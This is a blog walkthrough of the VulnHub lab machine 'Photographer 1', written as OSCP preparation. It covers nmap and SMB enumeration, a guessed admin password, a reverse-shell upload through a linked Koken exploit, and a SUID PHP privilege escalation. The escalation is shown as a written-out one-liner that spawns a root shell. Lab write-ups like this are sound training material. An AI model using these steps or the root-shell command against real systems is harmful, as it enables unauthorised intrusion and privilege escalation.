---
layout: post
title:  "Photographer 1"
date:   2020-08-05
categories: blog
tags:   [hacking, oscp prep]
---
**[Disclaimer!][1]**


### Photographer 1
Download: [VulnHub][2]  
**NOTE:** Always exercise caution when downloading VMs of this nature (or anything for that matter) 
from the internet. VulnHub offers some guidance around protecting yourself and your home network, 
and there are other resources out there to help as well. I have provided the link to VulnHub only 
as a reference, and cannot be held liable for what you download.

UPDATE: Credit where it's due! Big thanks to [@v1n1v131r4][12] for a great machine!

Got to start somewhere, might as well be with ```nmap```:
```
sudo nmap -vv -sV -sC -O 10.0.100.27
[sudo] password for graboid: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-01 15:04 EDT
...
Initiating NSE at 15:04
Completed NSE at 15:04, 0.00s elapsed
Initiating ARP Ping Scan at 15:04
Scanning 10.0.100.27 [1 port]
Completed ARP Ping Scan at 15:04, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:04
Completed Parallel DNS resolution of 1 host. at 15:04, 0.02s elapsed
Initiating SYN Stealth Scan at 15:04
Scanning 10.0.100.27 [1000 ports]
Discovered open port 80/tcp on 10.0.100.27
Discovered open port 139/tcp on 10.0.100.27
Discovered open port 445/tcp on 10.0.100.27
Discovered open port 8000/tcp on 10.0.100.27
Completed SYN Stealth Scan at 15:04, 0.07s elapsed (1000 total ports)
Initiating Service scan at 15:04
Scanning 4 services on 10.0.100.27
Completed Service scan at 15:04, 11.22s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.0.100.27
...
Nmap scan report for 10.0.100.27                                                                                                       
Host is up, received arp-response (0.00053s latency).
Scanned at 2020-08-01 15:04:45 EDT for 16s
Not shown: 996 closed ports
Reason: 996 resets
PORT     STATE SERVICE     REASON         VERSION
80/tcp   open  http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
MAC Address: 00:0C:29:CF:F7:EB (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
...

Uptime guess: 30.753 days (since Wed Jul  1 21:01:22 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h20m57s, deviation: 2h18m33s, median: 57s
| nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   PHOTOGRAPHER<00>     Flags: <unique><active>
|   PHOTOGRAPHER<03>     Flags: <unique><active>
|   PHOTOGRAPHER<20>     Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50706/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 37641/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38442/udp): CLEAN (Failed to receive data)
|   Check 4 (port 10917/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2020-08-01T15:05:56-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-01T19:05:56
|_  start_date: N/A

NSE: Script Post-scanning.
...
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.90 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.294KB)
```  

A quick peruse of the web server on ports 80 and 8000 show 2 different sites that look different
from each other, and a quick check of the Apache server version shows it is around 5 years old.
After a few quick searches, I am not seeing any major issues with this version of Apache httpd, so
I will move on to the SMB ports that are open.

Before we can attempt to connect to an SMB share on the target computer, we need to figure out what
shares might be exposed, which can easily be done using `nmap` scripts:
```
sudo nmap -vv -sV -p139,445 --script smb-enum-shares 10.0.100.27
... # Skipping to the juicy part!
Nmap scan report for 10.0.100.27
Host is up, received arp-response (0.00053s latency).
Scanned at 2020-08-01 15:28:43 EDT for 11s

PORT    STATE SERVICE     REASON         VERSION
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:CF:F7:EB (VMware)
Service Info: Host: PHOTOGRAPHER

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.0.100.27\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (photographer server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.0.100.27\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.0.100.27\sambashare: 
|     Type: STYPE_DISKTREE
|     Comment: Samba on Ubuntu
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\agi\share
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 15:28
Completed NSE at 15:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 15:28
Completed NSE at 15:28, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
```

From here, I want to try to connect to the 'sambashare' since it allows anonymous access. My choice
for something like this is usually to use the Linux command line client `smbclient`:
```
smbclient -W WORKGROUP -N \\\\10.0.100.27\\sambashare
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 20 21:30:07 2020
  ..                                  D        0  Tue Jul 21 05:44:25 2020
  mailsent.txt                        N      503  Mon Jul 20 21:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 21:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \>
```  

Jackpot! Like with anything in this kind of situation, I immediately download the contents of the
open share. I am in the habit of doing this so that I am not reliant on having to go back and pull
this information again later. In my lab with a machine like this one, the situation isn't likely
to change over time (unless someone is really crafty with the VM they create), but if I ever run
across something like this in a production environment it could trigger alarms and I might find
that the same technique doesn't work again if I try to come back later. This is less likely to be a
problem with something like an open share, but some expoits may cause instability or a service to
crash. This might mean that we would end up having to wait for the service to be restarted to 
exploit it again, and is likely to get us some unwanted attention from the blue team.  

The file 'wordpress.bkp.zip' appears to be a backup of a WordPress site, and the
contents of the 'mailsent.txt' file is below:
```
cat mailsent.txt
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

Certainly interesting, but unfortunately they didn't give up any credentials or services running on
non-standard ports. So from here, I start to take a look at the websites on ports 80 and 8000. I
like to start by taking a look at these sites in a browser, just to get an idea about what is out
there already. The site on port 80 appears to be a standard WordPress site, while the site on port
8000 is a bit more interesting.
    
![Strange post indeed](/assets/images/photographer-1-shell-php.png)

While the home page of the site on port 8000 does not offer much, clicking around I find that there
is a strangely named posting under the 'Content' page; a page named 'shell-1' and a file named
'shell.php'. The link on the page offers to download the file, so I hover over that and find the
link to the file to be 'http://10.0.100.27:8000/storage/originals/60/06/shell.php'. When I went to
this file directly it took a while for it to load, and even after it loaded I got the following
message:  
  
![I've seen that before...](/assets/images/photographer-1-shell-php-timeout.png)

Because I have worked with webshells on some previous lab machines, I immediately recognize this
page as the timeout page for a PHP reverse shell page from [PenTest Monkey][3]! This is an
interesting find, but not immediatley useful since the code in its original form is hard-coded to
an IP and port. At this point I'm curious about what else might be lurking on these websites, so I
decide to do a directory scan against them using `gobuster`. This was actually a great opportunity
for me to learn a few things about brute forcing directories and gobuster usage, but for the sake
of this post I'm just going to present you with the fruits of my labor below. I will link to a full
post about what I learned about gobuster in another post later.
```bash
gobuster dir --expanded \
             --wordlist /usr/share/wordlists/dirb/common.txt \
             --statuscodes "200,204,307,401,403" \
             --addslash \
             --extensions "" \
             --url http://10.0.100.27:8000/

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.100.27:8000/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Add Slash:      true
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/08/04 18:34:45 Starting gobuster
===============================================================
http://10.0.100.27:8000/.hta/ (Status: 403)
http://10.0.100.27:8000/.htpasswd/ (Status: 403)
http://10.0.100.27:8000/.htaccess/ (Status: 403)
http://10.0.100.27:8000/admin/ (Status: 200)
http://10.0.100.27:8000/album/ (Status: 200)
http://10.0.100.27:8000/albums/ (Status: 200)
http://10.0.100.27:8000/app/ (Status: 200)
http://10.0.100.27:8000/category/ (Status: 200)
http://10.0.100.27:8000/categories/ (Status: 200)
http://10.0.100.27:8000/content/ (Status: 200)
http://10.0.100.27:8000/contents/ (Status: 200)
http://10.0.100.27:8000/date/ (Status: 200)
http://10.0.100.27:8000/error/ (Status: 200)
http://10.0.100.27:8000/favorites/ (Status: 200)
http://10.0.100.27:8000/home/ (Status: 200)
http://10.0.100.27:8000/icons/ (Status: 403)
http://10.0.100.27:8000/index/ (Status: 200)
http://10.0.100.27:8000/lightbox/ (Status: 200)
http://10.0.100.27:8000/server-status/ (Status: 403)
http://10.0.100.27:8000/set/ (Status: 200)
http://10.0.100.27:8000/storage/ (Status: 403)
http://10.0.100.27:8000/tags/ (Status: 200)
http://10.0.100.27:8000/tag/ (Status: 200)
http://10.0.100.27:8000/timeline/ (Status: 200)
===============================================================
2020/08/04 18:34:58 Finished
===============================================================
```

This is definitely something we can work with, especially that `/admin/` directory... A quick
browse to that address shows us a login page!  
  
![Login page](/assets/images/photographer-port-8000-admin-login.png)  

Combine this with that interesting email that we found on the open SMB share and we might just have
something. Since it is asking for an email as the login and the email we read said that site was
set up for Daisa, let's assume their email is the login; now we just need to figure out the
password. Agi did call Daisa their 'babygirl'...and they were the one that made the website...so I
wonder...  
  
![BINGO!](/assets/images/photographer-port-8000-login-success.png)  

From here I did a little bit of exploring, found and downloaded the 'shell.php' file that we
discovered earlier, confirmed that it was the reverse shell we thought it was and then attempted
to upload my own reverse shell payload. Unfortunately for us, the application controlled the file
types that were allowed to be uploaded, so we would have to figure out another way to get the site
to accept our payload.  

After searching a bit more and turning up nothing, I decided to see if anyone had found something I
was missing so I did a search on the [Exploit-DB][9] for any known exploits. One quick search for
Koken 0.22.24 later and I found this [Koken exploit][4] that looked like it might give us the push
we needed. I will let you go check out the exploit to get the full details, but long story short
it involves intercepting the http request when you use the 'Import content' feature and manually
editing it before you actually pass it along to the server.

Using this exploit, I was able to upload the [PHP Reverse Shell payload][3] I edited for my machine
listening with `ncat`. With our payload up there, now all we have to do is navigate to that page
on the web server to force it to process the PHP and BOOM!:  
  
![Sweet, sweet low priv shell](/assets/images/photographer-1-reverse-shell-success.png)

We can't do much with this shell, as we can tell from this line:
```
/bin/sh: 0: can't access tty; job control turned off
```
So that means wee need to get a more full featured shell. There are a number of ways to do this,
but since I'm trying to learn Python, I like to use the Python example from [Pentest Monkey][5].
Now with our more complete shell, we can navigate around and start looking for flags. The VulnHub
post on this machine said there was a 'user.txt' flag and a 'root.txt' flag. It's pretty safe to
assume (and easy to confirm) that the 'www-data' user doesn't have rights to the root directory,
so I checked out the 'home' directory. A quick browse of Daisa's home directory gets us the user
flag:  
  
![user.txt](/assets/images/photographer-user-flag.png)

From here we get to poke around a bit, looking for a route to root. There are countless resources
out there that help with this area, so I will not attempt to present you with a comprehensive list
of Linux privilege escalation techniques. Rather, I will just talk a little bit about what I look
for once I have a low priv shell:
 * Linux distro and version
   * Sometimes you get lucky and it's old, just be careful before you start lobbing exploits
 * Currently running processes, especially those running as root
   * All running processes: ps aux
   * All processes, looking only for root: ps aux \| grep root
 * Special scripts or applications that are in home directories
 * Bash history  
  
This is nowhere near a comprehensive list, but just a jumping off point. There are a number of
scripts out there to help with post-exploitation enumeration. In this case, I used [LinEnum.sh][6]
to help me find my path to root. One of the things that this script finds are files that have the
SUID bit set or the SGID bit set. These files are important since they are always executed as if
the owning user (SUID) or the owning group (SGID) is executing them, regardless of the current
user's permissions. For a more detailed explanation about how these files operate, you can check
out the post on [LinuxHandbook.com][10]. In the case of this machine, one of the SUID files is
PHP7.2!  

From this point, we [DuckDuckGo!][11] Or we just check out [GTFObins][8]... This is a page that I
have found to be incredibly useful when looking for assistance on how to use normal files in my
not-so-normal ways, and today is no different. Here I found a quick example of how I could use a
PHP file for privilege escalation when it was set with root SUID privileges: [PHP - #SUID][7]
```bash
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

In our case, since PHP was already a SUID file, we only have to execute the final command from
GTFObins. Once that was done it was game over:  
  
![root.txt](/assets/images/photographer-root-flag.png)

[1]: /disclaimer/
[2]: https://www.vulnhub.com/entry/photographer-1,519/
[3]: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
[4]: https://www.exploit-db.com/exploits/48706
[5]: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
[6]: https://github.com/rebootuser/LinEnum
[7]: https://gtfobins.github.io/gtfobins/php/#suid
[8]: https://gtfobins.github.io/
[9]: https://www.exploit-db.com/
[10]: https://linuxhandbook.com/suid-sgid-sticky-bit/
[11]: https://duckduckgo.com/
[12]: https://twitter.com/v1n1v131r4
